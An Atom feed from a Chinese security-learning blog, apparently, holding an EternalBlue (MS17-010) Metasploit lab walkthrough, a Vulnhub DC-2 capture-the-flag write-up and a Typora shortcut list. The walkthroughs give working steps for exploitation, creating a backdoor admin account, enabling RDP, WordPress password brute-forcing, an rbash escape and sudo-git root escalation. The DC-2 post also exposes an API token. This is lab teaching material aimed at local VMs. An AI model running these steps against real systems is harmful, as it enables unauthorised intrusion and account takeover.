<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>知识加油站</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-05-12T02:00:27.170Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>深山法海</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub系列-DC3靶场</title>
    <link href="http://example.com/2023/05/12/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/05/12/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-05-12T02:00:27.000Z</published>
    <updated>2023-05-12T02:00:27.170Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>永恒之蓝 CVE-2017-0143</title>
    <link href="http://example.com/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/"/>
    <id>http://example.com/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/</id>
    <published>2023-05-11T05:25:37.000Z</published>
    <updated>2023-05-19T08:28:25.855Z</updated>
    
    <content type="html"><![CDATA[<h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><h3 id="一、什么是永恒之蓝"><a href="#一、什么是永恒之蓝" class="headerlink" title="一、什么是永恒之蓝"></a>一、什么是永恒之蓝</h3><p>永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p><h3 id="二、什么是SMB协议"><a href="#二、什么是SMB协议" class="headerlink" title="二、什么是SMB协议"></a>二、什么是SMB协议</h3><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口。</p><h3 id="三、漏洞描述"><a href="#三、漏洞描述" class="headerlink" title="三、漏洞描述"></a>三、漏洞描述</h3><p>永恒之蓝 主要就是通过TCP端口（445）和139 来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器里进行一系列的危险操作。如远程控制木马，获取最高权限等。</p><h3 id="四、影响范围"><a href="#四、影响范围" class="headerlink" title="四、影响范围"></a>四、影响范围</h3><p>windows xp 2003 2008 7 8 等受影响</p><h3 id="五、准备工具"><a href="#五、准备工具" class="headerlink" title="五、准备工具"></a>五、准备工具</h3><p>vm虚拟机软件</p><p>网络模式：NAT</p><p>攻击机：kali系统2023.1（192.168.170.128）</p><p>靶机：windows7系统专业版（开启了445端口，并且防火墙关闭）（192.168.170.142）</p><h3 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h3><h4 id="1-nmap扫描靶机"><a href="#1-nmap扫描靶机" class="headerlink" title="1 nmap扫描靶机"></a>1 nmap扫描靶机</h4><p>登录kali，win7系统，利用kali使用nmap扫描探测本网段存活的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.170.1/24</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519083902044.png" alt="image-20230519083902044"></p><p>发现我们的靶机开启了很多端口，我们需要找到的就是 <code>445</code> 端口。</p><p>445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。</p><h4 id="2-使用Metasploit监听目标"><a href="#2-使用Metasploit监听目标" class="headerlink" title="2 使用Metasploit监听目标"></a>2 使用Metasploit监听目标</h4><p>输入如下命令启动Metasploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518152450860.png" alt="image-20230518152450860"></p><h4 id="3-攻击流程"><a href="#3-攻击流程" class="headerlink" title="3 攻击流程"></a>3 攻击流程</h4><p>进入后查找找永恒之蓝漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518162234825.png" alt="image-20230518162234825"></p><blockquote><p>0   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue：用于利用EternalBlue漏洞实现SMB远程代码执行。</p><p>1   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程代码执行。</p><p>2   auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程命令执行。</p><p>3   auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010：用于检测目标是否存在MS17-010漏洞。</p><p>4   exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce：用于利用DoublePulsar漏洞实现SMB远程代码执行。</p></blockquote><p>选择检测模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure><p>查看模块信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure><p>查看需要修改的选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p>设置攻击目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.170.142</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084326942.png" alt="image-20230519084326942"></p><p>执行模块攻击检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084303566.png" alt="image-20230519084303566">前面为 <code>+</code> 号，表示可以攻击。</p><p>接下来的步骤就开始攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">back   #退出模块</span><br><span class="line">search ms17-010#查找漏洞</span><br><span class="line">use 0   #选择攻击模块</span><br><span class="line">set rhosts 192.168.170.142 #设置攻击目标</span><br><span class="line">run   #攻击</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090115579.png" alt="image-20230519090115579"></p><blockquote><p>成功 上图就是成功打进了</p><p>报错:漏洞利用因失败而中止（可能原因是win7版本的问题）</p></blockquote><h4 id="4-得到靶机shell"><a href="#4-得到靶机shell" class="headerlink" title="4 得到靶机shell"></a>4 得到靶机shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090824111.png" alt="image-20230519090824111"></p><p>接下来就是搞事情了</p><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519091036102.png" alt="image-20230519091036102"></p><p>由于有乱码，我们需要输入如下代码即可恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h4 id="5-通过shell对靶机进行控制"><a href="#5-通过shell对靶机进行控制" class="headerlink" title="5 通过shell对靶机进行控制"></a>5 通过shell对靶机进行控制</h4><h5 id="1-创建新用户"><a href="#1-创建新用户" class="headerlink" title="(1) 创建新用户"></a>(1) 创建新用户</h5><p>语法：net user 用户名 密码 &#x2F;add</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user yhzl 123456 /add</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092038840.png" alt="image-20230519092038840"></p><p>查看用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092348625.png" alt="image-20230519092348625"></p><h5 id="2-将用户添加至管理员组"><a href="#2-将用户添加至管理员组" class="headerlink" title="(2)将用户添加至管理员组"></a>(2)将用户添加至管理员组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yhzl /add</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519093534270.png" alt="image-20230519093534270"></p><h5 id="3-开启远程桌面功能"><a href="#3-开启远程桌面功能" class="headerlink" title="(3) 开启远程桌面功能"></a>(3) 开启远程桌面功能</h5><p>查看3389端口状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>看到3389端口并没有开启，开启3389端口</p><p>方法一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519094005308.png" alt="image-20230519094005308"></p><p>方法二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><h5 id="4-远程桌面连接靶机"><a href="#4-远程桌面连接靶机" class="headerlink" title="(4) 远程桌面连接靶机"></a>(4) 远程桌面连接靶机</h5><p>添加好之后，就可以用工具去连了，这里我目前知道的 kali 自带工具有 xfreerdp，这是公司的大佬介绍给我用的，还有一个是我自己找的，叫做：rdesktop。</p><p>现在分别讲讲各自的用法吧：</p><p><strong>xfreerdp 工具</strong><br>首先是 xfreerdp 的，命令格式如下：</p><p>很容易理解，&#x2F;u 就是用户名，&#x2F;p 是密码，&#x2F;v 是靶机（目标）的地址 &#x2F;size 就是图形化界面的大小而已。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:hack /p:123123 /v:192.168.170.142 /size:80%</span><br></pre></td></tr></table></figure><p><strong>5.2、xfreerdp 工具</strong></p><p>然后是 rdesktop，命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.170.142:3389</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519095116540.png" alt="image-20230519095116540"></p><p>连进来，为所欲为了，纯鼠标无脑操作，比命令行操作方便简单，到此结束。</p><p>上面这是一个简单的演示，告诉大家这个漏洞很危险，真正的攻击能做的事情更多。</p><p>注意：我们要做一个遵纪守法的白帽子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;永恒之蓝&quot;&gt;&lt;a href=&quot;#永恒之蓝&quot; class=&quot;headerlink&quot; title=&quot;永恒之蓝&quot;&gt;&lt;/a&gt;永恒之蓝&lt;/h1&gt;&lt;h3 id=&quot;一、什么是永恒之蓝&quot;&gt;&lt;a href=&quot;#一、什么是永恒之蓝&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC2靶场</title>
    <link href="http://example.com/2023/05/11/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/05/11/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-05-11T05:04:27.000Z</published>
    <updated>2023-05-11T05:16:32.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub系列-DC2靶场"><a href="#Vulnhub系列-DC2靶场" class="headerlink" title="Vulnhub系列-DC2靶场"></a>Vulnhub系列-DC2靶场</h1><h3 id="一、下载"><a href="#一、下载" class="headerlink" title="一、下载"></a>一、下载</h3><p>DC-2靶场下载地址：</p><blockquote><p><a href="http://www.five86.com/downloads/DC-2.zip">http://www.five86.com/downloads/DC-2.zip</a></p></blockquote><h3 id="二、工具"><a href="#二、工具" class="headerlink" title="二、工具"></a>二、工具</h3><p>vm虚拟机</p><p>kali系统</p><p>dc-2</p><h3 id="三、操作"><a href="#三、操作" class="headerlink" title="三、操作"></a>三、操作</h3><p>打开vm虚拟机，打开下载好的DC2中的DC-2.ova，输入虚拟机名称和选择存储路径，点击导入，一般会弹出导入失败的对话框，点击重试。导入完成后，配置网络，这里得注意，DC2所处的网段跟kali所处的网段得互通，双击网络适配器，这里我选择的是桥接模式，kali和DC2都是桥接模式。 </p><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230510144142004.png" alt="image-20230510144142004"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>kali打开终端，由于kali和DC1都是桥接模式，所以属于同一网站段，使用如下命令，查看网段所有的主机。得到DC2的IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230510145120011.png" alt="image-20230510145120011"></p><p>使用nmap对DC2开放的端口进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.56.112 -p- 1-65535</span><br></pre></td></tr></table></figure><blockquote><p>-A:选定用于使用进攻性方式扫描</p><p>-p :扫描指定的端口</p></blockquote><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511082902851.png" alt="image-20230511082902851"></p><p>可以看到开放了80端口，但是可以看出做了域名解析，所以需要在本地即kali的配置文件&#x2F;etc&#x2F;hosts文件写入172.163.1.46 dc-2即可完成本地域名解析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511083146539.png" alt="image-20230511083146539"></p><p>浏览器输入域名，进入网站，可以看出网站是由WordPress内容管理系统搭建的。还开放了7744端口，可以知道使用协议是ssh，所以可以远程连接。</p><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230510150534492.png" alt="image-20230510150534492"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>页面上发现flag1</p><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511083557020.png" alt="image-20230511083557020"></p><p>查看flag1中的内容</p><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p><strong>cewl</strong>是一个网页关键字抓取工具(抓取网页上的关键字，作为密码字典)</p><p>WordPress有一个kali自带扫描工具<strong>wpscan</strong>可以爆破网站的用户名，所以想到了用关键字作为密码继续进行爆破。</p><p>在根目录下创建dc文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /dc/dc2 cd /dc/dc2</span><br></pre></td></tr></table></figure><p>WPScan：是专门检查WordPress网站漏洞的工具，它可以全面检查wp网站的漏洞</p><p>输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -e u</span><br></pre></td></tr></table></figure><p>可以查看网站用户，得出结果有三个用户admin,jerry,tom,将这三个用户保存在us.txt文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim us.txt</span><br></pre></td></tr></table></figure><p>将得到的用户名写入us,txt中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate vt --api-token 7Os4VHcm0GryhbhkYbrRzTzXajiTAWU7s1SckvBl8xY</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -e u</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230510161807375.png" alt="image-20230510161807375"></p><p> cewl dc-2 -w pds.txt将网站首页下的关键词生成密码字典pds.txt.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl dc-2 -w pds.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230510162153252.png" alt="image-20230510162153252"></p><p>爆破口令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -U us.txt -P pds.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511084645058.png" alt="image-20230511084645058"></p><p>爆破出两个口令。<code>WordPrss</code>默认后台路径为<strong>wp-admin</strong>.登陆jerry&#x2F;adipiscing直接发现flag2.</p><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511085255782.png" alt="image-20230511085255782"></p><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>根据提示不能从<code>WordPrss</code>上面找到捷径，登陆tom也没有发现什么，这是时想到了还有7744端口，因为它是ssh协议所以直接尝试ssh连接。由于端口号不是22，所以需要用<code>-p 7744</code>指定端口号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.112 -p 7744</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511085852536.png" alt="image-20230511085852536"></p><p>进入命令行，tom登陆成功。查看tom用户下的文件看看有不有什么发现。</p><p>输入ls，发现当前目录下有flag3.txt，查看flag3.txt</p><p>方法一:</p><p>虽然发现了flag3.txt，但是读取不了，受到<a href="https://www.freebuf.com/articles/system/188989.html"><code>rbash</code>环境</a>的限制，需要绕过<code>rbash</code>限制。(查看<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">大佬的博客</a>搞定的，之前没接触过，哎，小白一匹)<br>执行以下命令进行绕过</p><blockquote><p>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a  注：把&#x2F;bin&#x2F;bash给a变量<br>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;    注：将&#x2F;bin 作为PATH环境变量导出<br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin   注：将&#x2F;usr&#x2F;bin作为PATH环境变量导出</p></blockquote><p>然后就可以执行</p><p>方法二：</p><p>虽然不能使用cat、tail、tac、more这些命令，但是我们在linux虚拟机里面，可以使用<strong>vi&#x2F;vim</strong>命令啊，哈哈哈，有点像非预期解。</p><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511090853518.png" alt="image-20230511090853518"></p><h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3的提示需要:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511093641124.png" alt="image-20230511093641124"></p><p> 直接在jerry根目录下拿到flag4.</p><h4 id="final-flag"><a href="#final-flag" class="headerlink" title="final-flag"></a>final-flag</h4><p>根据提示需要拿到root权限<br>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现git不需要命令具有root权限执行。于是强制进入git交互模式。输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/liu-yulongjichang/shenshanfahai/raw/master/image-20230511101537474.png" alt="image-20230511101537474"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vulnhub系列-DC2靶场&quot;&gt;&lt;a href=&quot;#Vulnhub系列-DC2靶场&quot; class=&quot;headerlink&quot; title=&quot;Vulnhub系列-DC2靶场&quot;&gt;&lt;/a&gt;Vulnhub系列-DC2靶场&lt;/h1&gt;&lt;h3 id=&quot;一、下载&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Typora快捷键</title>
    <link href="http://example.com/2023/03/29/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://example.com/2023/03/29/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
    <published>2023-03-28T18:34:21.000Z</published>
    <updated>2023-03-28T18:35:58.361Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + 1 ：一级标题</span><br><span class="line">Ctrl + 2 ：二级标题</span><br><span class="line">Ctrl + 3 ：三级标题</span><br><span class="line">Ctrl + 4 ：四级标题</span><br><span class="line">Ctrl + 5 ：五级标题</span><br><span class="line">Ctrl + 6 ：六级标题</span><br><span class="line">Ctrl + 0 ：段落</span><br><span class="line"></span><br><span class="line">Ctrl + = ：提升标题等级</span><br><span class="line">Ctrl + - ：降低标题等级</span><br><span class="line">Ctrl + Home ：跳转到文首</span><br><span class="line">Ctrl + End ：跳转到文末</span><br><span class="line">Ctrl + Tab ：应用内窗口切换</span><br><span class="line">Ctrl + / ：源代码模式</span><br><span class="line">Ctrl + \ ：清除样式</span><br><span class="line">Ctrl + [ ：减少缩进</span><br><span class="line">Ctrl + ] ：增加缩进</span><br><span class="line">Ctrl + 逗号 ：偏好设置</span><br><span class="line"></span><br><span class="line">Ctrl + A ：全选</span><br><span class="line">Ctrl + B ：加粗</span><br><span class="line">Ctrl + C ： 复制</span><br><span class="line">Ctrl + D ：选中当前词</span><br><span class="line">Ctrl + E ：选中当前格式文本</span><br><span class="line">Ctrl + F ：查找</span><br><span class="line">  F3 ：查找下一个</span><br><span class="line">shift + F3 ：查找上一个</span><br><span class="line">Ctrl + H ：替换</span><br><span class="line">Ctrl + I ：斜体</span><br><span class="line">Ctrl + J ：跳转到所选内容</span><br><span class="line">Ctrl + K ：超链接</span><br><span class="line">Ctrl + L ：选中当前行</span><br><span class="line">Ctrl + N ：新建文件</span><br><span class="line">Ctrl + O ：打开</span><br><span class="line">Ctrl + P ：快速打开（快速打开之前编辑过的历史文件）</span><br><span class="line">Ctrl + S ：保存</span><br><span class="line">Ctrl + T ：插入表格</span><br><span class="line">Ctrl + U ：下划线</span><br><span class="line">Ctrl + V ：粘贴</span><br><span class="line">Ctrl + W ：关闭</span><br><span class="line">Ctrl + X ：剪切</span><br><span class="line">Ctrl + Y ：重做</span><br><span class="line">Ctrl + Z ：撤销</span><br><span class="line"></span><br><span class="line">Ctrl + shift + 1 ：大纲</span><br><span class="line">Ctrl + shift + 2 ：文档列表</span><br><span class="line">Ctrl + shift + 3 ：文件树</span><br><span class="line">Ctrl + shift + 9 ：实际大小</span><br><span class="line"></span><br><span class="line">Ctrl + shift + C ：复制为MarkDown格式</span><br><span class="line">Ctrl + shift + D ：删除当前词</span><br><span class="line">Ctrl + shift + E ：使用上一次设置导出</span><br><span class="line">Ctrl + shift + F ：搜索</span><br><span class="line">Ctrl + shift + I ：插入图片</span><br><span class="line">Ctrl + shift + K ：插入代码块</span><br><span class="line">Ctrl + shift + L ：显示/隐藏侧边栏</span><br><span class="line">Ctrl + shift + M ：插入公式</span><br><span class="line">Ctrl + shift + N ：新建窗口</span><br><span class="line">Ctrl + shift + Q ：引用</span><br><span class="line">Ctrl + shift + S ：另存为</span><br><span class="line">Ctrl + shift + T ：重新打开关闭的文件</span><br><span class="line">Ctrl + shift + V ：粘贴为纯文本格式</span><br><span class="line">Ctrl + shift + X ：任务列表</span><br><span class="line"></span><br><span class="line">Ctrl + shift + [ ：有序列表</span><br><span class="line">Ctrl + shift + ] ：无序列表</span><br><span class="line">Ctrl + shift + = ：放大</span><br><span class="line">Ctrl + shift + - ：缩小</span><br><span class="line">Ctrl + shift + ` ：代码</span><br><span class="line"></span><br><span class="line">Alt + shift + P ：打印</span><br><span class="line">Alt + shift + 5 ：删除线</span><br><span class="line"></span><br><span class="line">Alt + Ctrl + P ：选择段落或块</span><br><span class="line"></span><br><span class="line">Alt + Ctrl + shift + P ：删除块</span><br><span class="line">Alt + Ctrl + shift + L ：删除当前行或句</span><br><span class="line">Alt + Ctrl + shift + E ：删除当前格式文本</span><br><span class="line"></span><br><span class="line">shift + F10 ：快捷操作弹窗</span><br><span class="line">shift + F12 ：开发者工具</span><br><span class="line"></span><br><span class="line">F3 ：查找</span><br><span class="line">F8 ：专注模式</span><br><span class="line">F9 ：打字机模式</span><br><span class="line">F11 ：全屏</span><br><span class="line"></span><br><span class="line">win + 句号 ：表情与符号</span><br><span class="line">Home ：跳转到行首</span><br><span class="line">End 